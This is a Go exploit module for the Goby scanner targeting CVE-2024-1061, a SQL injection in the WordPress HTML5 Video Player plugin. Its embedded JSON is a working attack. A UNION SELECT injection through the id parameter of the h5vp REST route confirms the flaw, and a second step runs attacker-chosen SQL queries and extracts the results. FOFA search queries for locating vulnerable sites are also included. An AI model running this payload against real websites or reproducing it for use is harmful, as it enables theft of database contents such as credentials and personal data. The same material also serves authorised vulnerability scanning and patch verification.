package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin HTML5 Video Player Plugin id Parameter SQL Injection Vulnerability (CVE-2024-1061)",
    "Description": "<p>The WordPress Plugin HTML5 Video Player is a plugin developed by the WordPress Foundation for playing HTML5 videos on websites. There is a SQL injection vulnerability in the id parameter of the get_view function in this plugin. Attackers can exploit this vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information), and even write malicious code to the server under high privilege conditions, further gaining server system permissions.</p>",
    "Product": "WordPress Plugin HTML5 Video Player",
    "Homepage": "https://cn.wordpress.org/plugins/html5-video-player/",
    "DisclosureDate": "2024-01-30",
    "PostTime": "2024-11-27",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"wordpress\" && body=\"html5-video-player\"",
    "GobyQuery": "body=\"wordpress\" && body=\"html5-video-player\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to perform SQL injection to access sensitive database information, potentially leading to data leaks, tampering, and system control, with severe consequences.</p>",
    "Recommendation": "<p>It is recommended to update the current system or software to the latest version to fix the vulnerability.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/136031565"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/h5vp/v1/view/1&id=1%27+union+select+NULL%2CNULL%2CNULL%2C%28SELECT%2BMD5%28{{{random_int}}}%29%29%2CNULL%2CNULL%2CNULL--+",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "\"video_id\": \"{{{random_md5}}}\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/",
                "keydemo|lastbody|variable|/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/?rest_route=/h5vp/v1/view/1&id=1%27+union+select+NULL%2CNULL%2CNULL%2C%28{{{payload_encode}}}%29%2CNULL%2CNULL%2CNULL--+",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"video_id\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"video_id\":\"([^'\"]+)\"",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-1061"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "WordPress Plugin HTML5 Video Player 插件 id 参数 SQL 注入漏洞 （CVE-2024-1061）",
            "Product": "WordPress Plugin HTML5 Video Player",
            "Description": "<p>WordPress Plugin HTML5 Video Player 是 WordPress 基金会开发的一款插件，用于在网站上播放 HTML5 视频。该插件的 get_view 函数中 id 参数存在 SQL 注入漏洞，攻击者可以利用此漏洞获取数据库中的敏感信息（例如，管理员后台密码、站点的用户个人信息），甚至在高权限的情况下向服务器中写入恶意代码，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>建议更新当前系统或软件至最新版，完成漏洞的修复。</p>",
            "Impact": "<p>该漏洞允许攻击者通过 SQL 注入获取数据库中的敏感信息，可能导致数据泄露、篡改和系统控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin HTML5 Video Player Plugin id Parameter SQL Injection Vulnerability (CVE-2024-1061)",
            "Product": "WordPress Plugin HTML5 Video Player",
            "Description": "<p>The WordPress Plugin HTML5 Video Player is a plugin developed by the WordPress Foundation for playing HTML5 videos on websites. There is a SQL injection vulnerability in the id parameter of the get_view function in this plugin. Attackers can exploit this vulnerability to obtain sensitive information from the database (such as admin backend passwords and user personal information), and even write malicious code to the server under high privilege conditions, further gaining server system permissions.</p>",
            "Recommendation": "<p>It is recommended to update the current system or software to the latest version to fix the vulnerability.</p>",
            "Impact": "<p>This vulnerability allows attackers to perform SQL injection to access sensitive database information, potentially leading to data leaks, tampering, and system control, with severe consequences.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "random_int": "define|variable|{{{rand|int|6}}}",
        "random_md5": "define|md5|{{{random_int}}}",
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|url_encode|{{{payload}}}"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "random_int",
        "random_md5",
        "payload",
        "payload_encode"
    ],
    "PocId": "9974"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}